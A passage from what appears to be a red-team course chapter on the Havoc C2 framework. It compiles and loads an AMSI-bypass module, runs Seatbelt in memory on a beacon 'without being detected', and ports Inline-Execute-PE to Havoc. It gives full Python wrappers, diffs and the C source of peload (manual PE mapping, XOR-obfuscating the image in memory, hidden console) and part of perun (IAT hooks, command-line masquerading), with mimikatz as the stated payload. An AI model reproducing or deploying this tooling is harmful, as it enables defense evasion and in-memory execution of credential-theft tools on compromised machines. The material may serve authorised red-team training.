            /* [iid_is][out] */

            __RPC__deref_out  void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        IMethodInfo* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        IMethodInfo* This);



    DUMMY_METHOD(GetTypeInfoCount);

    DUMMY_METHOD(GetTypeInfo);

    DUMMY_METHOD(GetIDsOfNames);

    DUMMY_METHOD(Invoke);



    DUMMY_METHOD(ToString);

    DUMMY_METHOD(Equals);

    DUMMY_METHOD(GetHashCode);

    DUMMY_METHOD(GetType);

    DUMMY_METHOD(MemberType);

    DUMMY_METHOD(name);

    DUMMY_METHOD(DeclaringType);

    DUMMY_METHOD(ReflectedType);

    DUMMY_METHOD(GetCustomAttributes);

    DUMMY_METHOD(GetCustomAttributes_2);

    DUMMY_METHOD(IsDefined);



    HRESULT(STDMETHODCALLTYPE* GetParameters)(

        IMethodInfo* This,

        SAFEARRAY** pRetVal);



    DUMMY_METHOD(GetMethodImplementationFlags);

    DUMMY_METHOD(MethodHandle);

    DUMMY_METHOD(Attributes);

    DUMMY_METHOD(CallingConvention);

    DUMMY_METHOD(Invoke_2);

    DUMMY_METHOD(IsPublic);

    DUMMY_METHOD(IsPrivate);

    DUMMY_METHOD(IsFamily);

    DUMMY_METHOD(IsAssembly);

    DUMMY_METHOD(IsFamilyAndAssembly);

    DUMMY_METHOD(IsFamilyOrAssembly);

    DUMMY_METHOD(IsStatic);

    DUMMY_METHOD(IsFinal);

    DUMMY_METHOD(IsVirtual);

    DUMMY_METHOD(IsHideBySig);

    DUMMY_METHOD(IsAbstract);

    DUMMY_METHOD(IsSpecialName);

    DUMMY_METHOD(IsConstructor);



    HRESULT(STDMETHODCALLTYPE* Invoke_3)(

        IMethodInfo* This,

        VARIANT     obj,

        SAFEARRAY* parameters,

        VARIANT* ret);



    DUMMY_METHOD(returnType);

    DUMMY_METHOD(ReturnTypeCustomAttributes);

    DUMMY_METHOD(GetBaseDefinition);



    END_INTERFACE

} MethodInfoVtbl;



typedef struct _MethodInfo {

    MethodInfoVtbl* lpVtbl;

} MethodInfo;



typedef struct ICorConfigurationVtbl

{

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            ICorConfiguration* This,

            /* [in] */ REFIID riid,

            /* [iid_is][out] */

            __RPC__deref_out  void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        ICorConfiguration* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        ICorConfiguration* This);



    HRESULT(STDMETHODCALLTYPE* SetGCThreadControl)(

        ICorConfiguration* This,

        /* [in] */ IGCThreadControl* pGCThreadControl);



    HRESULT(STDMETHODCALLTYPE* SetGCHostControl)(

        ICorConfiguration* This,

        /* [in] */ IGCHostControl* pGCHostControl);



    HRESULT(STDMETHODCALLTYPE* SetDebuggerThreadControl)(

        ICorConfiguration* This,

        /* [in] */ IDebuggerThreadControl* pDebuggerThreadControl);



    HRESULT(STDMETHODCALLTYPE* AddDebuggerSpecialThread)(

        ICorConfiguration* This,

        /* [in] */ DWORD dwSpecialThreadId);



    END_INTERFACE

} ICorConfigurationVtbl;



typedef struct _ICorConfiguration

{

    ICorConfigurationVtbl* lpVtbl;

}ICorConfiguration;



typedef struct IGCThreadControlVtbl

{

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            IGCThreadControl* This,

            /* [in] */ REFIID riid,

            /* [iid_is][out] */

            __RPC__deref_out  void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        IGCThreadControl* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        IGCThreadControl* This);



    HRESULT(STDMETHODCALLTYPE* ThreadIsBlockingForSuspension)(

        IGCThreadControl* This);



    HRESULT(STDMETHODCALLTYPE* SuspensionStarting)(

        IGCThreadControl* This);



    HRESULT(STDMETHODCALLTYPE* SuspensionEnding)(

        IGCThreadControl* This,

        DWORD Generation);



    END_INTERFACE

} IGCThreadControlVtbl;



typedef struct _IGCThreadControl

{

    IGCThreadControlVtbl* lpVtbl;

}IGCThreadControl;



typedef struct IGCHostControlVtbl

{

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            IGCHostControl* This,

            /* [in] */ REFIID riid,

            /* [iid_is][out] */

            __RPC__deref_out  void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        IGCHostControl* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        IGCHostControl* This);



    HRESULT(STDMETHODCALLTYPE* RequestVirtualMemLimit)(

        IGCHostControl* This,

        /* [in] */ SIZE_T sztMaxVirtualMemMB,

        /* [out][in] */ SIZE_T* psztNewMaxVirtualMemMB);



    END_INTERFACE

} IGCHostControlVtbl;



typedef struct _IGCHostControl

{

    IGCHostControlVtbl* lpVtbl;

} IGCHostControl;



typedef struct IDebuggerThreadControlVtbl

{

    BEGIN_INTERFACE



        HRESULT(STDMETHODCALLTYPE* QueryInterface)(

            IDebuggerThreadControl* This,

            /* [in] */ REFIID riid,

            /* [iid_is][out] */

            __RPC__deref_out  void** ppvObject);



    ULONG(STDMETHODCALLTYPE* AddRef)(

        IDebuggerThreadControl* This);



    ULONG(STDMETHODCALLTYPE* Release)(

        IDebuggerThreadControl* This);



    HRESULT(STDMETHODCALLTYPE* ThreadIsBlockingForDebugger)(

        IDebuggerThreadControl* This);



    HRESULT(STDMETHODCALLTYPE* ReleaseAllRuntimeThreads)(

        IDebuggerThreadControl* This);



    HRESULT(STDMETHODCALLTYPE* StartBlockingForDebugger)(

        IDebuggerThreadControl* This,

        DWORD dwUnused);



    END_INTERFACE

} IDebuggerThreadControlVtbl;



typedef struct _IDebuggerThreadControl {

    IDebuggerThreadControlVtbl* lpVtbl;

} IDebuggerThreadControl;

```

With all these files in the same directory, we can now issue the compilation command.

```
➜  amsipatch git:(main) ✗ x86_64-w64-mingw32-gcc -c amsipatch.c amsipatch.o
x86_64-w64-mingw32-gcc: warning: amsipatch.o: linker input file unused because linking not done
➜  amsipatch git:(main) ✗
```

As result of this command, an `amsipatch.o` file has been created. You can then verify that all the required files are in the `amsipatch` directory that we created earlier.

```
➜  amsipatch git:(main) ✗ pwd
/home/kali/SquidGuard/Havoc/client/Modules/amsipatch
➜  amsipatch git:(main) ✗ ls
amsipatch.c  amsipatch.o  amsipatch.py  beacon.h  inlineExecute-Assembly.h
➜  amsipatch git:(main) ✗
```

When confirmed that all files are there, we can now proceed and attempt to use this module in Havoc.

# Using our AMSI Patch Module in Havoc

Now that our module is created and ready to be used, we will need to import it. This can be done as follows.

![](/assets/imgs/havoc-c2/Pasted image 20240219162651.png)

From there, click on the `Load Script` button at the bottom of the screen.

![](/assets/imgs/havoc-c2/Pasted image 20240219162712.png)

Now, you'll need to find the directory in which our module resides. Once found, double click on the `amsipatch.py` file to import it.

![](/assets/imgs/havoc-c2/Pasted image 20240219162909.png)

Once imported, let's see if it appears.

![](/assets/imgs/havoc-c2/Pasted image 20240219162949.png)

Appears to be there! Let's now execute it to patch AMSI in our current process.

![](/assets/imgs/havoc-c2/Pasted image 20240219163015.png)

Looks like the patch was successful. It's now time to see if we can execute `Seatbelt.exe` using the `dotnet inline-execute` module.

```
19/02/2024 16:31:08 [Neo] Demon » dotnet inline-execute /home/kali/SquidGuard/Seatbelt.exe scheduledtasks

[*] [879E50B2] Tasked demon to inline execute a dotnet assembly: /home/kali/SquidGuard/Seatbelt.exe

[+] Send Task to Agent [198 bytes]
[*] Using CLR Version: v4.0.30319
[+] Received Output [130179 bytes]:

%&&@@@&&

&&&&&&&%%%, #&&@@@@@@%%%%%%###############%

&%& %&%% &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%

%%%%%%%%%%%######%%%#%%####% &%%**# @////(((&%%%%%%######################(((((((((((((((((((

#%#%%%%%%%#######%#%%####### %&%,,,,,,,,,,,,,,,, @////(((&%%%%%#%#####################(((((((((((((((((((

#%#%%%%%%#####%%#%#%%####### %%%,,,,,, ,,. ,, @////(((&%%%%%%%######################(#(((#(#((((((((((

#####%%%#################### &%%...... ... .. @////(((&%%%%%%%###############%######((#(#(####((((((((

#######%##########%######### %%%...... ... .. @////(((&%%%%%#########################(#(#######((#####

###%##%%#################### &%%............... @////(((&%%%%%%%%##############%#######(#########((#####

#####%###################### %%%.. @////(((&%%%%%%%################

&%& %%%%% Seatbelt %////(((&%%%%%%%%#############*

&%%&&&%%%%% v1.2.1 ,(((&%%%%%%%%%%%%%%%%%,

#%%%%##,

  

  

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)


Name : NahimicSvc32Run
Principal :
GroupId : Users
Id : Author
LogonType : Batch
RunLevel : TASK_RUNLEVEL_HIGHEST
UserId :
Author : _COMPANY_NAME_
Description : Runs the _PRODUCT_NAME_ product
Source :
State : Disabled
SDDL :
Enabled : False
Date : 1/1/0001 12:00:00 AM
AllowDemandStart : True
DisallowStartIfOnBatteries : False
ExecutionTimeLimit : PT72H
StopIfGoingOnBatteries : False
Actions :

------------------------------

Type : MSFT_TaskAction
Arguments : $(Arg0) $(Arg1) $(Arg2) $(Arg3) $(Arg4) $(Arg5) $(Arg6) $(Arg7)
Execute : "C:\WINDOWS\SysWOW64\NahimicSvc32.exe"
------------------------------

Triggers :
------------------------------
```

Success! No alert was generated and we are now able to execute C# code in the memory of our current process without being detected.

# Improving Inline PE execution

Remember the `noconsolation` module we went over some time earlier in the course? This module allowed us to execute PE's such as mimikatz completely in memory. This approach avoids the hassle of uploading the binary on disk and thus, reduces our chances of getting detected. However, we were facing problems with reading the output. The output would appear in the wrong place.

![](/assets/imgs/havoc-c2/Pasted image 20240219143746.png)

Instead of seeing the output in our Havoc console, it would get displayed in the in the same terminal where our loader was executed. We already spoke about why this is problematic ; if we were to obtain a beacon via a phishing attack for example, we would have no way of viewing the output of our commands.

So, to counter this, we will be looking at another alternative that is not present in Havoc at the time of writing : `Inline-Execute-PE` which can be found at the following GitHub repo.

https://github.com/Octoberfest7/Inline-Execute-PE

This module was initially intended to be used with Cobalt Strike meaning that some modifications from our part will be required to make it compatible with Havoc. 

## Understanding the key components of Inline-Execute-PE

Similar to `noconsolation`, this module will allow us to load and execute PE's completely from memory. However, there are a few keypoints that need to be considered and understood before moving further. The Inline-Execute-PE module itself, is composed of multiple modules, but we will only be using two of them :

- peload
- perun

The `peload` module is responsible for loading the PE's in memory. It will not **execute** it. The PE will loaded into memory at a specific open memory space. Additionally, the module will XOR-encrypt the binary bytes in memory for an extra stealth layer. Once this is done, a memory address representing the start of the PE in memory will be outputted to our Havoc console. This module will accept 2 arguments : 

- The local binary in question(mimikatz on our machine)
- XOR key to be used for encryption

The `perun` module evidently, is responsible for executing the inline PE and getting back the output. `perun`, as you'll see later on, will indeed give us the output back in the console as opposed to `noconsolation`. `perun` accepts a few arguments as well :

- The XOR that was initially used for encryption. This needs to be provided for a successful decryption of the PE's code in memory
- The entry memory address where the code resides in memory
- Any arguments that you wish to provide to the PE


We'll start by cloning the repo in our `Modules` directory. From there, we will create 2 `py` files.

- peload.py
- perun.py

Those files represent the two modules that we will using. Now let's check out their contents.

`peload.py`

```
from havoc import Demon, RegisterCommand
from struct import pack, calcsize

# Creating the Packer class ; responsible for all the packing operations

class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)
def peload(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

	# Verify that the process arch is not x86

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return

	# Just a debug message for the user
	
    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked beacon to load exe binary in memory" )

	# Initiating the Packer
	
    Task = Packer()

	# The first param represents the local file path of the PE, this filepath is then read and saved in the fileBytes variable for future use
    f = open(param[0], "rb")
    fileBytes = f.read()
    f.close()

# The arguemnts are provided to the BOF

    Task.addstr( fileBytes)
    Task.addstr( param [ 1 ] )
    demon.InlineExecute( TaskID, "go", f"peload.x64.o", Task.getbuffer(), False)
    return TaskID

# The command is registered

RegisterCommand( peload , "", "peload", "in process loading exe", 0, "<local path to .exe> <key for xor>", '/home/kali/VulnLabs/mimikatz.exe key123')
```

`perun.py`

```
from havoc import Demon, RegisterCommand
from struct import pack, calcsize

# Declaring the Packer

class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)
def perun(demonID, *param):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

# Verifying the process arch is not x86

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return

# Simple debug message for the user

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked beacon to execute exe loaded in memory" )

# Initiating the Packer

    Task = Packer()

# Adding the arguments required for the BOF

    Task.addstr( param [ 0 ] )
    Task.addstr( param [ 1 ] )
    Task.addstr( param [ 2 ] )
    demon.InlineExecute( TaskID, "go", f"perun.x64.o", Task.getbuffer(), False)
    return TaskID

# Registering the command

RegisterCommand( perun , "", "perun", "in process execution of an exe", 0, "<key used to xor from before(peload)> <peload memaddr where data is stored in memory> <cmd>", 'key123 2640607254384 " coffee exit"')

```

As you can see, those files have a high resemblance to the previous modules we've taken a look at. Instead of going through each part individually again, comments have been added at important places for your convenience.

### Small modifications added to BOF's

There have been a few modifications done to both `peload.c` and `perun.c`. Those modifications have done to reduce the number of arguments we need to specify when using the modules. This of course, is only done for our convenience. All modifications to both files are outlined below.

```
➜  Inline-Execute-PE git:(main) ✗ diff peload.c peload.c.1
221c221
<       BOOL local = 0;
---
>       BOOL local = BeaconDataInt(&parser);
```

```
➜  Inline-Execute-PE git:(main) ✗ diff perun.c perun.c.1
462,463c462
<       //dwTimeout = BeaconDataInt(&parser);
<       dwTimeout = 5000;
---
>       dwTimeout = BeaconDataInt(&parser);
465c464
<
---
>       /* //Debug
470c469
<
---
>       */
493c492
< }
---
> }
```

Here are both files in their complete form for your convenience.

`peload.c`

```
#include "bofdefs.h"
#include "beacon.h"

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS
#define ARRAY_MODULES_SIZE 128

//PE vars
IMAGE_NT_HEADERS* ntHeader = NULL;

FILE *__cdecl __acrt_iob_funcs(int index)
{
    return &(__iob_func()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))


BYTE* getNtHdrs(BYTE* pe_buffer)
{
	if (pe_buffer == NULL) return NULL;

	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	const LONG kMaxOffset = 1024;
	LONG pe_offset = idh->e_lfanew;
	if (pe_offset > kMaxOffset) return NULL;
	IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((BYTE*)pe_buffer + pe_offset);
	if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
	return (BYTE*)inh;
}

IMAGE_DATA_DIRECTORY* getPeDir(PVOID pe_buffer, size_t dir_id)
{
	if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

	BYTE* nt_headers = getNtHdrs((BYTE*)pe_buffer);
	if (nt_headers == NULL) return NULL;

	IMAGE_DATA_DIRECTORY* peDir = NULL;

	IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
	peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

	if (peDir->VirtualAddress == NULL) {
		return NULL;
	}
	return peDir;
}

void xorPE(char* pImageBase, DWORD sizeofimage, char* key)
{
	//Copy key into char array for easier use in XOR function
	char temp[100] = {0};
	memcpy(temp, key, strlen(key));

	DWORD a = 0;

	while (a < sizeofimage) {
		//If byte isn't null, we xor it
		if(*(pImageBase + a) != 0x00) //if((*(pImageBase + a) != 0x00 ) && (*(pImageBase + a) ^ temp[a % strlen(temp)] != 0x00))
		{
			//XOR byte using key
			*(pImageBase + a) ^= temp[a % strlen(temp)];

			//If resulting byte is a null byte, we xor back to original
			if(*(pImageBase + a) == 0x00)
			{
				*(pImageBase + a) ^= temp[a % strlen(temp)];
			}
		}
		a++;
	}
	memset(temp, 0, strlen(key));
	return;
}

BOOL peLoader(char* data, int peLen, char* key)
{
	//Create MemAddr struct to contain important values for the mapped PE
	struct MemAddrs *pMemAddrs  = malloc(sizeof(struct MemAddrs));
	memset(pMemAddrs, 0, sizeof(struct MemAddrs));

//------------------------------------------Manually map PE into memory------------------------------------------

	LONGLONG fileSize = -1;
	LPVOID preferAddr = 0;
	ntHeader = (IMAGE_NT_HEADERS*)getNtHdrs(data);
	if (!ntHeader)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[-] File isn't a PE file.");
		BeaconPrintf(CALLBACK_OUTPUT, "peload failure");

		//Free pMemAddr struct
		free(pMemAddrs);

		return FALSE;
	}

	IMAGE_DATA_DIRECTORY* relocDir = getPeDir(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;
	//BeaconPrintf(CALLBACK_OUTPUT, "[+] Exe File Prefer Image Base at %x\n", preferAddr);

	HMODULE dll = LoadLibraryA("ntdll.dll");
	((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);

	pMemAddrs->pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pMemAddrs->pImageBase && !relocDir)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Allocate Image Base At %x Failure.\n", preferAddr);
		BeaconPrintf(CALLBACK_OUTPUT, "peload failure");

		//Free pMemAddr struct
		free(pMemAddrs);

		return FALSE;
	}
	if (!pMemAddrs->pImageBase && relocDir)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Try to Allocate Memory for New Image Base\n");
		pMemAddrs->pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!pMemAddrs->pImageBase)
		{
			BeaconPrintf(CALLBACK_OUTPUT, "[-] Allocate Memory For Image Base Failure.\n");
			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");

			//Free pMemAddr struct
			free(pMemAddrs);

			return FALSE;
		}
	}

	ntHeader->OptionalHeader.ImageBase = (size_t)pMemAddrs->pImageBase;
	memcpy(pMemAddrs->pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

	IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)((size_t)(ntHeader) + sizeof(IMAGE_NT_HEADERS));
	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
	{
		//BeaconPrintf(CALLBACK_OUTPUT, "    [+] Mapping Section %s\n", SectionHeaderArr[i].Name);
		memcpy((LPVOID)((size_t)(pMemAddrs->pImageBase) + SectionHeaderArr[i].VirtualAddress), (LPVOID)((size_t)(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
	}
  
	//Update struct with EntryPoint, ImageSize
	pMemAddrs->AddressOfEntryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint;
	pMemAddrs->SizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
  
	//Encrypt PE in memory
	xorPE(pMemAddrs->pImageBase, pMemAddrs->SizeOfImage, key);

	//Now create back-up of PE in memory so we can restore it in-between runs.
	//Some PE's can run multiple times without issues, other crash on 2nd run for unknown reasons. Remapping works fine.
	pMemAddrs->pBackupImage = (BYTE*)VirtualAlloc(NULL, pMemAddrs->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(pMemAddrs->pBackupImage, pMemAddrs->pImageBase, pMemAddrs->SizeOfImage);
	
	//Enumerate all loaded DLL's before we have map/run the new PE to establish baseline so we can unload DLL's later
	DWORD cbNeeded;
  	HMODULE* loadedModules = calloc(ARRAY_MODULES_SIZE, sizeof(HMODULE));
    EnumProcessModules((HANDLE)-1, loadedModules, ARRAY_MODULES_SIZE * sizeof(HMODULE), &cbNeeded);
	pMemAddrs->dwNumModules = cbNeeded / sizeof(HMODULE);
	free(loadedModules);

//------------------------Now create conhost.exe, setup stdout/stderr, and redirect output-----------------------

	//Allocate Console
	BOOL suc = AllocConsole();

    //Immediately hide window
	ShowWindow(GetConsoleWindow(), SW_HIDE);

    //Reopen stdout/stderr and associate to new FILE* fout and ferr
    freopen_s(&pMemAddrs->fout, "CONOUT$", "r+", stdout);
    freopen_s(&pMemAddrs->ferr, "CONOUT$", "r+", stderr);

	//Set pMemAddrs->bCloseFHandles to TRUE by default
	//This distinction is necessary because depending on whether we bail on execution during perun, we have to alter how we cleanup
	pMemAddrs->bCloseFHandles = TRUE;

	//Create an Anonymous pipe for both stdout and stderr
	SECURITY_ATTRIBUTES sao = { sizeof(sao),NULL,TRUE };
	CreatePipe(&pMemAddrs->hreadout, &pMemAddrs->hwriteout, &sao, 0);

	//Set StandardOutput and StandardError in PEB to write-end of anonymous pipe
    SetStdHandle(STD_OUTPUT_HANDLE, pMemAddrs->hwriteout);
	SetStdHandle(STD_ERROR_HANDLE, pMemAddrs->hwriteout);

	//Create File Descriptor from the Windows Handles for write-end of anonymous pipe
	pMemAddrs->fo = _open_osfhandle((intptr_t)(pMemAddrs->hwriteout), _O_TEXT);

	//These redirect output from mimikatz
	//Reassign reopened FILE* for stdout/stderr to the File Descriptor for the anonymous pipe
	_dup2(pMemAddrs->fo, _fileno(pMemAddrs->fout));
	_dup2(pMemAddrs->fo, _fileno(pMemAddrs->ferr));

	//These redirect output from cmd.exe.  Not sure why these are valid/necessary given that _freopen_s SHOULD close original FD's (1 and 2)
	//Reassign original FD's for stdout/stderr to the File Descriptor for the anonymous pipe 
	_dup2(pMemAddrs->fo, 1);
	_dup2(pMemAddrs->fo, 2);

	//Send output back to CS to update petable with MemAddr Struct location
	char pMemAddrstr[20] = {0};
	sprintf_s(pMemAddrstr, 20, "%" PRIuPTR, (uintptr_t)pMemAddrs);
    BeaconPrintf(CALLBACK_OUTPUT, "peload %s", pMemAddrstr);
}

int go(IN PCHAR Buffer, IN ULONG Length) 
{
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);

	int dataextracted = 0;
	int peLen = 0;

	//data var will either contain the full PE as bytes OR the name of a local PE to load. The bool 'local' tells peload which to expect. 
	char* data = BeaconDataExtract(&parser, &peLen);
	char* key = BeaconDataExtract(&parser, &dataextracted);
	BOOL local = 0;

	//If a local PE was specified, try and read it from disk
	if(local)
	{
		//Try and open a handle to the specified file
		HANDLE hFile = CreateFileA(data, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 

		if (hFile == INVALID_HANDLE_VALUE) 
		{
			BeaconPrintf(CALLBACK_OUTPUT, "Unable to open %s. Last error: %d", data, GetLastError());
			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
			return -1; 
		}

		LARGE_INTEGER lpFileSize;

		//Get size of file
		if(!GetFileSizeEx(hFile, &lpFileSize))
		{
			BeaconPrintf(CALLBACK_OUTPUT, "Unable to determine filesize of %s. Last error: %d", data, GetLastError());
			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
			return -1;   
		}

		//Allocate buffer to hold PE
		char* pe = calloc(lpFileSize.LowPart + 1, sizeof(char));

		//Read file into buffer
		DWORD bRead;
		if(!ReadFile(hFile, pe, lpFileSize.LowPart, &bRead, NULL))
		{
			BeaconPrintf(CALLBACK_OUTPUT, "Unable to read %s from disk. Last error: %d", data, GetLastError());
			BeaconPrintf(CALLBACK_OUTPUT, "peload failure");
			return -1;   
		}

		//Map PE into memory
		peLoader(pe, lpFileSize.LowPart, key);

		//Clear file from memory
		memset(pe, 0, lpFileSize.LowPart);
		free(pe);
			
		return 0;
	}

	//Otherwise we were sent the full PE already, just load it.,
	else
	{
		peLoader(data, peLen, key);
		return 0;
	}
}
```

`perun.c`

```
#include "bofdefs.h"
#include "beacon.h"

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS
#define BUFFER_SIZE 8192
#define _WAIT_TIMEOUT 5000

//cmdline args vars
BOOL hijackCmdline = FALSE;
char *sz_masqCmd_Ansi = NULL;
char *sz_masqCmd_ArgvAnsi[100];
wchar_t *sz_masqCmd_Widh = NULL;
wchar_t *sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
struct MemAddrs *pMemAddrs = NULL;
DWORD dwTimeout = 0;

//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;

//-------------All of these functions are custom-defined versions of functions we hook in the PE's IAT-------------

LPWSTR hookGetCommandLineW()
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinew");
	return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{ 
	//BeaconPrintf(CALLBACK_OUTPUT, "called: getcommandlinea");
	return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argv");
	return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___wargv");
	return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called: __p___argc");
	return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called __wgetmainargs");
	*_Argc = int_masqCmd_Argc;
	*_Argv = poi_masqArgvW;

	return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called __getmainargs");
	*_Argc = int_masqCmd_Argc;
	*_Argv = poi_masqArgvA;

	return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called onexit!\n");
	return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
	//BeaconPrintf(CALLBACK_OUTPUT, "called atexit!\n");
	return 0;
}

int __cdecl hookexit(int status)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "Exit called!\n");
	//_cexit() causes cmd.exe to break for reasons unknown...
	ExitThread(0);
	return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
	//BeaconPrintf(CALLBACK_OUTPUT, "ExitProcess called!\n");
	ExitThread(0);
}

//-----Have to redefine __acrt_iob_func and stdin/stdout/stderr due to CS inability to resolve __acrt_iob_func-----

FILE *__cdecl __acrt_iob_funcs(unsigned index)
{
    return &(__iob_func()[index]);
}

#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))


//This function handles transforming the basic Ansi cmdline string from CS into all of the different formats that might be required by a PE
void masqueradeCmdline()
{
	//Convert cmdline to widestring
	int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
	sz_masqCmd_Widh = calloc(required_size + 1, sizeof(wchar_t));
	MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

	//Create widestring array of pointers
	poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

	//Manual function equivalent for CommandLineToArgvA
	int retval;
	int memsize = int_masqCmd_Argc * sizeof(LPSTR);
	for (int i = 0; i < int_masqCmd_Argc; ++ i)
	{
		retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
		memsize += retval;
	}

	poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

	int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
	LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
	for (int i = 0; i < int_masqCmd_Argc; ++ i)
	{
		retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
		poi_masqArgvA[i] = buffer;
		buffer += retval;
		bufLen -= retval;
	}

	hijackCmdline = TRUE;
}


//-------These next two functions necessary to zero-out/free the char*/wchar_t* arrays holding cmdline args--------

//This array is created manually since CommandLineToArgvA doesn't exist, so manually freeing each item in array
void freeargvA(char** array, int Argc)
{
	//Wipe cmdline args from beacon memory
	for (int i = 0; i < Argc; i++)
	{
		memset(array[i], 0, strlen(array[i]));
	}
	LocalFree(array);
}

//This array is returned from CommandLineToArgvW so using LocalFree as per MSDN
void freeargvW(wchar_t** array, int Argc)
{
	//Wipe cmdline args from beacon memory
	for (int i = 0; i < Argc; i++)
	{
